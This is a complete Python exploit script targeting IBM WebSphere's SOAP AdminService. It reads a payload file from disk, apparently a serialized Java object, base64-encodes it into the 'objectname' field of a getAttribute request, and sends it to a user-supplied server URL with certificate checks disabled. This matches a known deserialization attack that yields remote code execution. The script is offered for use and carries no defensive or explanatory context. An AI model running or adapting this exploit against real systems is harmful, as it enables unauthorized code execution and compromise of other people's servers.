#!/usr/bin/env python
# coding: utf-8

import sys
import base64
import requests


if len(sys.argv) < 2:
    print('Usage: python %s <websphere_soap_url> </path/to/payload>' % sys.argv[0])
    sys.exit()

ws_url = sys.argv[1]
pd_path = sys.argv[2]

i_headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36',
    'Content-Type': 'text/xml',
    'SOAPAction': 'urn:AdminService'
}
xml_content = '''<?xml version='1.0' encoding='UTF-8'?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
<SOAP-ENV:Header xmlns:ns0="admin" ns0:WASRemoteRuntimeVersion="8.5.5.1" ns0:JMXMessageVersion="1.2.0" ns0:SecurityEnabled="true" ns0:JMXVersion="1.2.0">
<LoginMethod>BasicAuth</LoginMethod>
</SOAP-ENV:Header>
<SOAP-ENV:Body>
<ns1:getAttribute xmlns:ns1="urn:AdminService" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<objectname xsi:type="ns1:javax.management.ObjectName">{0}</objectname>
<attribute xsi:type="xsd:string">ringBufferSize</attribute>
</ns1:getAttribute>
</SOAP-ENV:Body>
</SOAP-ENV:Envelope>
'''
print('Exploit ====> Read payload from file "%s"' % pd_path)
payload_obj = open(pd_path, 'rb').read()
payload_obj_b64 = base64.b64encode(payload_obj)
payload = xml_content.format(payload_obj_b64)
print('Exploit ====> Sending payload to "%s"...' % ws_url)
response = requests.post(ws_url, headers=i_headers, data=payload, verify=False)
